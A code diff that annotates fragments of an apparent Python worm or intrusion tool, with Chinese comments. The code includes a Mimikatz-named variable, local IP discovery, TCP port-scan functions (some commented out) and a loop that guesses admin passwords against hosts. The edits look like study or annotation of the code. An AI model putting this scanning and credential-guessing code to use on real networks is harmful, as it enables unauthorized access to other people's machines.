@@ -116,7 +116,7 @@ ntlist = []
 
 mkatz = "abc"
 
-# 获取本地IP和外网IP
+# 获取本地IP和外网IP, 返回全局变量iplist2 列表
 def find_ip():
     global iplist2
     ipconfig_process = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)
@@ -159,16 +159,16 @@ def xip(numb):
 
     return nip
 
-
-def scan(ip, p):
-    global timeout
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(float(timeout) if timeout else None)
-    try:
-        s.connect((ip, p))
-        return 1
-    except Exception as e:
-        return 0
+# 探测目标IP的端口是否开放
+# def scan(ip, p):
+#     global timeout
+#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#     s.settimeout(float(timeout) if timeout else None)
+#     try:
+#         s.connect((ip, p))
+#         return 1
+#     except Exception as e:
+#         return 0
 
 
 def scan2(ip, p):
@@ -181,22 +181,22 @@ def scan2(ip, p):
         return 0
 
 
-def scan3(ip, p):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(float(1))
-    try:
-        s.connect((ip, p))
-        return 1
-    except Exception as e:
-        return 0
+# def scan3(ip, p):
+#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#     s.settimeout(float(1))
+#     try:
+#         s.connect((ip, p))
+#         return 1
+#     except Exception as e:
+#         return 0
 
 # 漏洞验证
 def validate(ip, fr):
     global userlist2 # admin administrator
-    global dl # 空
-    global ee2 # 空
-    global domainlist # 空列表
-    global passlist # 密码
+    global dl
+    global ee2
+    global domainlist
+    global passlist
     for u in userlist2:
         for p in passlist:
             if u == '' and p != '':
